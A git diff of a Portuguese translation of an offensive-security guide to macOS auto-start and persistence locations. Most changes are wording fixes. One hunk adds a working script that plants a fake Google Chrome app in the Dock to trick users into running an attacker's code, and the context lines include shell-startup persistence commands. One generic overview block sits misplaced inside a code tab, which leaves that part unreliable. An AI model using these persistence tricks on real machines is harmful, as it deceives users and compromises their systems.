@@ -92,8 +92,8 @@ launchctl list
 ```
 ### Arquivos de inicialização do shell
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
-Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)
+Descrição: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
+Descrição (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)
 
 * Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
 
@@ -132,7 +132,7 @@ echo "touch /tmp/hacktricks" >> ~/.zshrc
 Configurar a exploração indicada e fazer logout e login ou até mesmo reiniciar não funcionou para mim para executar o aplicativo. (O aplicativo não estava sendo executado, talvez precise estar em execução quando essas ações forem realizadas)
 {% endhint %}
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)
+**Descrição**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)
 
 * Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
 
@@ -145,7 +145,7 @@ Configurar a exploração indicada e fazer logout e login ou até mesmo reinicia
 
 Todas as aplicações a serem reabertas estão dentro do plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
 
-Portanto, para fazer com que as aplicações reabertas executem a sua própria, você só precisa **adicionar o seu aplicativo à lista**.
+Portanto, para fazer com que as aplicações reabertas executem o seu próprio aplicativo, você só precisa **adicionar o seu aplicativo à lista**.
 
 O UUID pode ser encontrado listando esse diretório ou com `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`
 
@@ -511,7 +511,7 @@ Artigo: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.g
 #### **Descrição**
 
 "As tarefas at" são usadas para **agendar tarefas em horários específicos**.\
-Essas tarefas diferem do cron no sentido de que **são tarefas únicas** que são removidas após a execução. No entanto, elas **sobreviverão a uma reinicialização do sistema**, portanto, não podem ser descartadas como uma ameaça potencial.
+Essas tarefas diferem do cron no sentido de que **são tarefas únicas** que são removidas após a execução. No entanto, elas **sobrevivem a uma reinicialização do sistema**, portanto, não podem ser descartadas como uma ameaça potencial.
 
 Por **padrão**, elas estão **desabilitadas**, mas o usuário **root** pode **habilitá-las** com:
 ```bash
@@ -571,11 +571,11 @@ total 32
 -r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
 -rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
 ```
-O nome do arquivo contém a fila, o número do trabalho e o horário em que está programado para ser executado. Por exemplo, vamos dar uma olhada em `a0001a019bdcd2`.
+O nome do arquivo contém a fila, o número do trabalho e o horário programado para ser executado. Por exemplo, vamos dar uma olhada em `a0001a019bdcd2`.
 
 * `a` - esta é a fila
 * `0001a` - número do trabalho em hexadecimal, `0x1a = 26`
-* `019bdcd2` - horário em hexadecimal. Representa os minutos decorridos desde o epoch. `0x019bdcd2` é `26991826` em decimal. Se multiplicarmos por 60, obtemos `1619509560`, que é `GMT: 27 de abril de 2021, terça-feira, 7:46:00`.
+* `019bdcd2` - tempo em hexadecimal. Representa os minutos decorridos desde o epoch. `0x019bdcd2` é `26991826` em decimal. Se multiplicarmos por 60, obtemos `1619509560`, que é `GMT: 27 de abril de 2021, terça-feira, 7:46:00`.
 
 Se imprimirmos o arquivo do trabalho, descobrimos que ele contém as mesmas informações que obtivemos usando `at -c`.
 
@@ -597,7 +597,7 @@ Artigo: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-892
 
 #### Descrição e Exploração
 
-Um script de Ação de Pasta é executado quando itens são adicionados ou removidos da pasta à qual está anexado, ou quando sua janela é aberta, fechada, movida ou redimensionada:
+Um script de Ação de Pasta é executado quando itens são adicionados ou removidos da pasta à qual ele está anexado, ou quando sua janela é aberta, fechada, movida ou redimensionada:
 
 * Abrir a pasta via interface do Finder
 * Adicionar um arquivo à pasta (pode ser feito arrastando e soltando ou até mesmo em um prompt de terminal)
@@ -731,7 +731,60 @@ killall Dock
 ```
 {% endcode %}
 
-### Selecionadores de Cores
+Usando alguma **engenharia social**, você poderia **se passar, por exemplo, pelo Google Chrome** dentro do dock e realmente executar seu próprio script:
+```bash
+#!/bin/sh
+
+# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
+
+rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null
+
+# Create App structure
+mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
+mkdir -p /tmp/Google\ Chrome.app/Contents/Resources
+
+# Payload to execute
+echo '#!/bin/sh
+open /Applications/Google\ Chrome.app/ &
+touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
+
+chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
+
+# Info.plist
+cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>CFBundleExecutable</key>
+<string>Google Chrome</string>
+<key>CFBundleIdentifier</key>
+<string>com.google.Chrome</string>
+<key>CFBundleName</key>
+<string>Google Chrome</string>
+<key>CFBundleVersion</key>
+<string>1.0</string>
+<key>CFBundleShortVersionString</key>
+<string>1.0</string>
+<key>CFBundleInfoDictionaryVersion</key>
+<string>6.0</string>
+<key>CFBundlePackageType</key>
+<string>APPL</string>
+<key>CFBundleIconFile</key>
+<string>app</string>
+</dict>
+</plist>
+EOF
+
+# Copy icon from Google Chrome
+cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns
+
+# Add to Dock
+defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
+killall Dock
+```
+### Seletores de Cores
 
 Descrição: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)
 
@@ -743,17 +796,17 @@ Descrição: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilb
 
 * `/Library/ColorPickers`&#x20;
 * Requer privilégios de root
-* Gatilho: Usar o selecionador de cores
+* Gatilho: Usar o seletor de cores
 * `~/Library/ColorPickers`
-* Gatilho: Usar o selecionador de cores
+* Gatilho: Usar o seletor de cores
 
 #### Descrição e Exploração
 
-**Compile um pacote** de selecionador de cores com seu código (você pode usar [**este, por exemplo**](https://github.com/viktorstrate/color-picker-plus)) e adicione um construtor (como na seção [Protetor de Tela](macos-auto-start-locations.md#screen-saver)) e copie o pacote para `~/Library/ColorPickers`.
+**Compile um pacote** de seletor de cores com seu código (você pode usar [**este, por exemplo**](https://github.com/viktorstrate/color-picker-plus)) e adicione um construtor (como na seção [Protetor de Tela](macos-auto-start-locations.md#screen-saver)) e copie o pacote para `~/Library/ColorPickers`.
 
-Então, quando o selecionador de cores for acionado, seu código também será.
+Então, quando o seletor de cores for acionado, seu código também será.
 
-Observe que o binário que carrega sua biblioteca tem um **sandbox muito restritivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+Observe que o binário que carrega sua biblioteca possui um **sandbox muito restritivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 
 {% code overflow="wrap" %}
 ```bash
@@ -825,7 +878,7 @@ Timestamp                       (process)[PID]
 {% endcode %}
 
 {% hint style="danger" %}
-Observe que, devido às permissões do binário que carrega este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), você estará **dentro do sandbox de aplicativos comuns**.
+Observe que, devido às permissões do binário que carrega este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), você estará **dentro do sandbox comum do aplicativo**.
 {% endhint %}
 
 Código do protetor de tela:
@@ -1136,7 +1189,47 @@ Após colocar um novo diretório em uma dessas duas localizações, **mais dois 
 </dict>
 </plist>
 ```
-{% tab title="supernomeservico" %}
+{% tab title="superservicename" %}
+
+# Localizações de Inicialização Automática do macOS
+
+O macOS possui várias localizações onde os aplicativos podem ser configurados para iniciar automaticamente quando o sistema é inicializado. Essas localizações são usadas por aplicativos legítimos para fornecer funcionalidades adicionais ou para iniciar serviços em segundo plano.
+
+No entanto, essas localizações também podem ser exploradas por atacantes para iniciar aplicativos maliciosos ou scripts de inicialização que podem comprometer a segurança do sistema.
+
+Aqui estão algumas das principais localizações de inicialização automática do macOS:
+
+## 1. LaunchAgents
+
+Os LaunchAgents são arquivos de propriedade do usuário que são executados quando um usuário faz login. Eles são armazenados no diretório `~/Library/LaunchAgents` e têm a extensão `.plist`. Esses arquivos podem ser usados para iniciar aplicativos ou scripts de inicialização quando um usuário faz login.
+
+## 2. LaunchDaemons
+
+Os LaunchDaemons são arquivos de propriedade do sistema que são executados quando o sistema é inicializado. Eles são armazenados no diretório `/Library/LaunchDaemons` e têm a extensão `.plist`. Esses arquivos são usados para iniciar serviços em segundo plano que são executados independentemente de qualquer usuário fazer login.
+
+## 3. Login Items
+
+Os Login Items são aplicativos ou scripts que são configurados para iniciar automaticamente quando um usuário faz login. Eles são gerenciados nas preferências do sistema, na seção "Usuários e Grupos". Os Login Items podem ser usados para iniciar aplicativos ou scripts específicos para um usuário quando ele faz login.
+
+## 4. Startup Items
+
+Os Startup Items são aplicativos ou scripts que são configurados para iniciar automaticamente quando o sistema é inicializado. Eles são armazenados no diretório `/Library/StartupItems` e são executados antes que qualquer usuário faça login. No entanto, essa localização não é mais suportada nas versões mais recentes do macOS.
+
+## 5. Cron Jobs
+
+Os Cron Jobs são tarefas agendadas que são executadas em intervalos regulares. Eles são configurados usando o utilitário `cron` e podem ser usados para iniciar aplicativos ou scripts em horários específicos. Os Cron Jobs são armazenados no arquivo `/etc/crontab` e nos arquivos no diretório `/etc/cron.d`.
+
+## 6. LaunchAgents e LaunchDaemons de Terceiros
+
+Além das localizações mencionadas acima, os aplicativos de terceiros também podem instalar seus próprios LaunchAgents e LaunchDaemons. Esses arquivos podem ser armazenados em diferentes diretórios, dependendo do aplicativo.
+
+## Verificando e Removendo Inicializações Automáticas Indesejadas
+
+Para verificar as inicializações automáticas existentes no macOS, você pode usar o utilitário `launchctl`. Para remover uma inicialização automática indesejada, você pode usar o comando `launchctl remove` seguido pelo identificador da inicialização automática.
+
+É importante verificar regularmente as inicializações automáticas do macOS para garantir que apenas aplicativos legítimos estejam sendo executados e para evitar possíveis pontos de entrada para ataques maliciosos.
+
+{% endtab %}
 ```bash
 #!/bin/sh
 . /etc/rc.common
@@ -1168,7 +1261,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.
 
 A Apple introduziu um mecanismo de registro chamado **emond**. Parece que nunca foi totalmente desenvolvido e o desenvolvimento pode ter sido **abandonado** pela Apple em favor de outros mecanismos, mas ainda está **disponível**.
 
-Este serviço pouco conhecido pode **não ser muito útil para um administrador de Mac**, mas para um ator de ameaça, uma razão muito boa seria usá-lo como um **mecanismo de persistência que provavelmente a maioria dos administradores do macOS não saberia** procurar. Detectar o uso malicioso do emond não deve ser difícil, pois o System LaunchDaemon para o serviço procura scripts para serem executados apenas em um único local:
+Este serviço pouco conhecido pode **não ser muito útil para um administrador de Mac**, mas para um ator de ameaça, uma razão muito boa seria usá-lo como um **mecanismo de persistência que provavelmente a maioria dos administradores do macOS não conheceria**. Detectar o uso malicioso do emond não deve ser difícil, pois o System LaunchDaemon para o serviço procura scripts para serem executados em apenas um local:
 ```bash
 ls -l /private/var/db/emondClients
 ```
@@ -1222,7 +1315,7 @@ Descrição: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevil
 
 #### Descrição e exploração
 
-Aparentemente, o `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estava usando esse binário enquanto expunha um serviço XPC... o problema é que o binário não existia, então você poderia colocar algo lá e quando o serviço XPC fosse chamado, seu binário seria chamado.
+Aparentemente, o `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estava usando esse binário enquanto expunha um serviço XPC... o problema é que o binário não existia, então você poderia colocar algo lá e quando o serviço XPC fosse chamado, seu binário seria executado.
 
 Não consigo mais encontrar isso no meu macOS.
 
@@ -1352,6 +1445,6 @@ esac
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
